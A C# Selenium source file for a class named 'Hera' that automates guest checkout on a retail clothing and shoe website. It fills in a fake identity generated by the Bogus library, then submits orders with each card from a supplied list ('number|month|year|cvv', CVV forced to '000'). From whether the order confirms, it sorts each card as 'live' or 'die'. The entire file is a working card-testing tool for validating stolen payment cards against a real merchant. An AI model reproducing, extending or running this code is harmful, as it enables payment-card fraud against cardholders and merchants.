using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Threading;

namespace _0lymp.us.Gods
{

    public partial class Hera : Component
    {
        public delegate void VerifyCardsCompleteHandler();

        public delegate void StateCardsCompleteHandler(string card);

        public delegate void ReduceCardsCompleteHandler(string cards);

        private static IWebDriver hera;

        public List<string> cardsList;

        public string url;

        private Faker faker;

        private string firstName;

        private string lastName;

        private string address;

        private string address2;

        private string zip;

        private string city;

        private string state;

        private string email;

        private string phone;

        public Thread VerifyCardsThread;

        public Thread StateCardsThread;

        public Thread ReduceCardsThread;


        public event VerifyCardsCompleteHandler VerifyCardsComplete;

        public event StateCardsCompleteHandler LiveCardComplete;

        public event StateCardsCompleteHandler DieCardComplete;

        public event ReduceCardsCompleteHandler ReduceCardsComplete;

        public Hera()
        {
            InitializeComponent();
            faker = new Faker();
        }

        public Hera(IContainer container)
        {
            container.Add(this);
            InitializeComponent();
        }

        public void VerifyCards()
        {
            Random random = new Random();
            firstName = faker.Name.FirstName();
            lastName = faker.Name.LastName();
            address = faker.Address.StreetAddress();
            address2 = ((Math.Round(random.NextDouble()) == 0.0) ? "" : faker.Address.SecondaryAddress());
            city = faker.Address.City();
            zip = faker.Address.ZipCode("#####");
            state = faker.Address.StateAbbr();
            email = faker.Internet.Email();
            phone = faker.Phone.PhoneNumber();
            Load();
            hera.Kill();
            this.VerifyCardsComplete();
        }

        private void Load()
        {
            Random random = new Random();
            int index = random.Next(1, 6);
            int num = random.Next(1, 24);
            try
            {
                List<string> source = new List<string>
            {
                url + "/women/shoes/under-45/?Categories=women&Categories=shoes&Categories=under-45&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice",
                url + "/women/clothing/under-20/?Categories=women&Categories=clothing&Categories=under-20&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice",
                url + "/men/shoes/under-45/?Categories=men&Categories=shoes&Categories=under-45&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice",
                url + "/men/clothing/under-20/?Categories=men&Categories=clothing&Categories=under-20&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice",
                url + "/kids/boys/?Categories=kids&Categories=boys&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice",
                url + "/kids/girls/?Categories=kids&Categories=girls&PriceRange=&OnSale=&Icon=&Brand=0&PageSize=24&Page=1&Branded=False&ListType=Grid&Text=&Sorting=LowestPrice"
            };
                hera = Driver.Chrome();
                hera.GoUrl(source.ElementAt(index));
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.CssSelector($"#Items > figure:nth-child({num}) > div > figcaption > a"), "ExceptionLoad"))
            {
                Restart();
            }
            else
            {
                GoToProduct(num);
            }
        }

        private void GoToProduct(int i)
        {
            try
            {
                hera.FindElement(By.CssSelector($"#Items > figure:nth-child({i}) > div > figcaption > a")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (hera.WaitForLoadElement(By.CssSelector("#AddToCartControls > div.selfClearAfter.addToCartControl.selectorContainer.SmallButton > span > a")))
            {
                SelectSize();
            }
            if (hera.WaitForLoadElement(By.CssSelector("#AddToCartControls > div.selfClearAfter.addToCartControl.RadioButton.WidthButton > span > label")))
            {
                SelectWidth();
            }
            if (!hera.WaitForLoadElement(By.Id("AddToCartButtonStyle"), "ExceptionGoToProduct"))
            {
                Restart();
            }
            else
            {
                AddToCart();
            }
        }

        private void SelectSize()
        {
            try
            {
                (from x in hera.FindElements(By.CssSelector("#AddToCartControls > div.selfClearAfter.addToCartControl.selectorContainer.SmallButton > span > a")).ToList()
                 orderby Guid.NewGuid()
                 select x).FirstOrDefault().JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void SelectWidth()
        {
            try
            {
                (from x in hera.FindElements(By.CssSelector("#AddToCartControls > div.selfClearAfter.addToCartControl.RadioButton.WidthButton > span > label")).ToList()
                 orderby Guid.NewGuid()
                 select x).FirstOrDefault().JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void AddToCart()
        {
            try
            {
                hera.FindElement(By.Id("AddToCartButtonStyle")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.Id("ContinueToCart"), "ExceptionAddToCart"))
            {
                Restart();
            }
            else
            {
                ViewMyCart();
            }
        }

        private void ViewMyCart()
        {
            try
            {
                hera.FindElement(By.Id("ContinueToCart")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.CssSelector("#CartBottonButtons > div > a.button.checkoutButton.cartCheckout"), "ExceptionViewMyCart"))
            {
                Restart();
            }
            else
            {
                CartCheckout();
            }
        }

        private void CartCheckout()
        {
            try
            {
                hera.FindElement(By.CssSelector("#CartBottonButtons > div > a.button.checkoutButton.cartCheckout")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.CssSelector("#GuestCheckout > a"), "ExceptionCartCheckout"))
            {
                Restart();
            }
            else
            {
                GuestCheckout();
            }
        }

        private void GuestCheckout()
        {
            try
            {
                hera.FindElement(By.CssSelector("#GuestCheckout > a")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.Id("ShippingAddress_FirstName"), "ExceptionGuestCheckout"))
            {
                Restart();
            }
            else
            {
                CheckoutAdreesses();
            }
        }

        private void CheckoutAdreesses()
        {
            try
            {
                hera.FindElement(By.Id("ShippingAddress_FirstName")).SendKeys(firstName);
                hera.FindElement(By.Id("ShippingAddress_LastName")).SendKeys(lastName);
                hera.FindElement(By.Id("ShippingAddress_Address1")).SendKeys(address);
                hera.FindElement(By.Id("ShippingAddress_Address2")).SendKeys(address2);
                hera.FindElement(By.Id("ShippingAddress_City")).SendKeys(city);
                new SelectElement(hera.FindElement(By.Id("ShippingAddress_StateOrProvince"))).SelectByValue(state);
                hera.FindElement(By.Id("ShippingAddress_PostalCode")).SendKeys(zip);
                hera.FindElement(By.Id("ShippingAddress_Phone1")).SendKeys(phone);
                hera.FindElement(By.Id("Email")).SendKeys(email);
                Thread.Sleep(10000);
                hera.FindElement(By.CssSelector("#CheckoutMain > div > section.addresses > form > div.selfClearAfter.form > div > input.button.formButtonSubmit.shippingMethodButton")).Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (hera.WaitForLoadElement(By.Id("UseEnteredNoMatch")))
            {
                UseEnteredNoMatch();
            }
            else if (hera.WaitForLoadElement(By.CssSelector("#AVSSelectModal > div > div.selfClearAfter.modalContainer.rightSide.multiAddresses > div > div > div > label")))
            {
                UseSuggestedMultipleMatch();
            }
            else if (hera.WaitForLoadElement(By.Id("UseSuggestedSingleMatch")))
            {
                UseSuggestedSingleMatch();
            }
            if (!hera.WaitForLoadElement(By.Id("ContinueToPayment"), "ExceptionCheckoutAdreesses"))
            {
                Restart();
            }
            else
            {
                ContinueToPayment();
            }
        }

        private void UseEnteredNoMatch()
        {
            try
            {
                hera.FindElement(By.Id("UseEnteredNoMatch")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void UseSuggestedSingleMatch()
        {
            try
            {
                hera.FindElement(By.Id("UseSuggestedSingleMatch")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void UseSuggestedMultipleMatch()
        {
            try
            {
                (from x in hera.FindElements(By.CssSelector("#AVSSelectModal > div > div.selfClearAfter.modalContainer.rightSide.multiAddresses > div > div > div > label")).ToList()
                 orderby Guid.NewGuid()
                 select x).FirstOrDefault().JsClick();
                hera.FindElement(By.Id("UseSuggestedMultipleMatch")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ContinueToPayment()
        {
            try
            {
                hera.FindElement(By.Id("ContinueToPayment")).JsClick();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.Id("ContinueToReview"), "ExceptionContinueToPayment"))
            {
                Restart();
            }
            else
            {
                LastProccess();
            }
        }

        private void LastProccess()
        {
            try
            {
                int num = 0;
                while (num < cardsList.Count())
                {
                    List<string> list = cardsList[num].Split('|').ToList();
                    if (cardsList.Count() > 1)
                    {
                        cardsList[num] = cardsList[num].Replace("\r", "");
                    }
                    string text = cardsList[num];
                    string cards = cardsList[num].ToString();
                    if (cardsList.Count() > 1)
                    {
                        string text3 = cardsList[num] = (cardsList[num] += "\r");
                        cards = string.Join("", cardsList.ToArray());
                        text += "\r";
                    }
                    Payment(list[0], list[1], list[2], list[3]);
                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        cardsList.Remove(cardsList[num]);
                        if (cardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        cardsList.Remove(cardsList[num]);
                    }
                }
            }
            catch (ArgumentOutOfRangeException)
            {
            }
        }

        private void Payment(string number, string month, string year, string cvv)
        {
            try
            {
                hera.FindElement(By.Id("card_number")).Clear();
                hera.FindElement(By.Id("card_number")).SendKeys(number);
                new SelectElement(hera.FindElement(By.Id("ExpirationMonth"))).SelectByValue(month);
                new SelectElement(hera.FindElement(By.Id("ExpirationYear"))).SelectByValue(year);
                hera.FindElement(By.Id("card_cvn")).Clear();
                hera.FindElement(By.Id("card_cvn")).SendKeys("000");
                hera.FindElement(By.Id("cybersourceSecureFormButton")).JsClick();
                Thread.Sleep(5000);
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (!hera.WaitForLoadElement(By.Id("SubmitOrderButton"), "ExceptionPayment"))
            {
                Restart();
            }
            else
            {
                SubmitOrder();
            }
        }

        private void SubmitOrder()
        {
            try
            {
                hera.FindElement(By.Id("SubmitOrderButton")).JsClick();
                Thread.Sleep(5000);
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private bool Confirmation()
        {
            if (!hera.WaitForLoadElement(By.CssSelector("#Modals > div > div > div > strong"), "ExceptionConfirmationDie"))
            {
                if (!hera.WaitForLoadElement(By.CssSelector("#OrderReceipt > div > div.confirmationOrder"), "ExceptionConfirmationLive"))
                {
                    Restart();
                    return false;
                }
                return true;
            }
            PreparedForDie();
            return false;
        }

        private void PreparedForDie()
        {
            try
            {
                hera.FindElement(By.CssSelector("#Modals > div > a")).JsClick();
                Thread.Sleep(5000);
                hera.FindElement(By.Id("EditPaymentButton")).JsClick();
                Thread.Sleep(5000);
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void Restart()
        {
            hera.Kill();
            VerifyCards();
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        public void KillThread()
        {
            try
            {
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                hera.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }
    }

}
